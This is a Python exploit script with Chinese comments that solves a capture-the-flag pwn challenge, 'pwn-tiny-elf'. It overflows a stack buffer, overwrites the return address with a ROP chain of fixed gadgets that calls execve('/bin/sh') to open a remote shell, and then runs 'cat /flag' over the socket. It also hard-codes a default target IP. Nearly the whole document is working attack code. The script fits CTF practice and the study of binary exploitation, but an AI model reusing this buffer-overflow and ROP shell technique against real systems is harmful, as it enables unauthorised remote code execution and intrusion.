#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
pwn-tiny-elf 利用脚本 —— 纯 Python3（无 pwntools / 无第三方依赖）

用法:
    python3 solve.py <HOST> <PORT>
    (若不给参数则打默认 110.42.112.160，端口需按题目环境传入)

漏洞链:
    1. 程序用 read(0, r15+8, 102) 把最多 102 字节读到栈上缓冲
       (缓冲起始 == 返回地址 - 0x30，返回地址在偏移 0x30 = 48 处)。
    2. 溢出覆盖返回地址，ROP 调 execve("/bin/sh", 0, 0)。

需要的 gadget (均在二进制自身，无 PIE，地址固定):
    pop rax; ret          @ 0x400123  (藏在解密后的消息末尾 "Goodbye~\\nX\\xc3")
    pop rdi; xor ebx,ebx; ret @ 0x40000a  (藏在 ELF 头里，pop r15 的下一个字节)
    syscall; ret          @ 0x400030  (ELF 头 e_flags 处的 0f 05 c3)
    "/bin/sh"             @ 0x400125

注意:
    程序在 ret 之前已经执行了 xor rsi,rsi / xor rdx,rdx，所以 execve 的
    argv=NULL、envp=NULL 已经就绪，无需再设置 rsi/rdx。
"""
import re
import socket
import struct
import sys
import time

HOST = "110.42.112.160"
PORT = 0  # 由命令行提供

# ---- 二进制内固定地址 ----
POP_RAX_RET = 0x400123   # 58 c3
POP_RDI_RET = 0x40000A   # 5f 31 db c3
SYSCALL_RET = 0x400030   # 0f 05 c3
BIN_SH      = 0x400125   # "/bin/sh\x00"
SYS_EXECVE  = 59


def p64(x):
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def recv_until(s, mark, timeout=10.0):
    s.settimeout(timeout)
    data = b""
    while mark not in data:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def build_payload():
    # 返回地址位于缓冲偏移 0x30 = 48 处
    payload = b"A" * 48
    payload += p64(POP_RAX_RET) + p64(SYS_EXECVE)   # rax = 59 (execve)
    payload += p64(POP_RDI_RET) + p64(BIN_SH)       # rdi = "/bin/sh"
    payload += p64(SYSCALL_RET)                     # execve("/bin/sh",0,0)
    return payload


def main():
    if len(sys.argv) >= 3:
        host, port = sys.argv[1], int(sys.argv[2])
    else:
        host, port = HOST, PORT
    if not port:
        print("[!] 用法: python3 solve.py <HOST> <PORT>")
        sys.exit(1)

    print("[*] 目标 %s:%d" % (host, port))
    s = socket.create_connection((host, port), timeout=15)

    # 1. 读横幅 "Do you want to say something to me?"
    banner = recv_until(s, b"say something to me?")
    print(banner.decode(errors="replace"))

    # 2. 发送 ROP 链
    payload = build_payload()
    print("[*] 发送 exp (%d 字节)" % len(payload))
    s.sendall(payload)

    # 3. 程序打印 "Goodbye~\n" 后进入 ROP -> execve -> shell
    recv_until(s, b"Goodbye")

    # 4. 拿到 shell 后读 flag（flag 在远程 /flag）
    s.sendall(b"cat /flag 2>/dev/null; cat flag 2>/dev/null\n")
    time.sleep(1)

    out = b""
    s.settimeout(5)
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk

    print(out.decode(errors="replace"))
    m = re.search(rb"flag\{[^}]*\}", out)
    if m:
        print("\n[+] FLAG =", m.group().decode())
    s.close()


if __name__ == "__main__":
    main()
